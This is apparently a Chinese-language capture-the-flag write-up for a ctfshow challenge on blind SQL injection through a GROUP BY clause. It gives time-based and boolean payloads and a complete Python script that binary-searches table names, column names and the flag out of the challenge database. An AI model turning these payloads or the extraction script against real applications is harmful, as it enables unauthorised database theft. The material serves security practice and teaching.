## **groupby盲注**
分页查询，原意是根据username或id分组。
```  
//分页查询 
  $sql = select * from ctfshow_user group by $username;
```   

时间盲注
```
1,if(1=1,sleep(0.1),1)
```

布尔盲注
```
concat(database(),floor(rand(0)*30))
```
脚本：
原意是根据username或id分组，如此而来回显差异
```
import requests
import time

url='http://60eb33c3-f99f-40ab-a612-d0085affb66a.challenge.ctf.show/api/index.php?u='

flag=''
for i in range(1,100):
    min=32
    max=128
    while 1:
        j=min+(max-min)//2
        if min==j:
            flag+=chr(j)
            print(flag)
            break

        #payload=f"if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),{i},1))<{j},username,id)"
        #payload=f"if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name='ctfshow_flaga'),{i},1))<{j},username,id)"
        payload=f"if(ascii(substr((select group_concat(flagaabc) from ctfshow_flaga),{i},1))<{j},username,id)"

        r=requests.get(url=url+payload).text
        #print(r.text)
        if len(r)<288:
            max=j
        else:
            min=j

```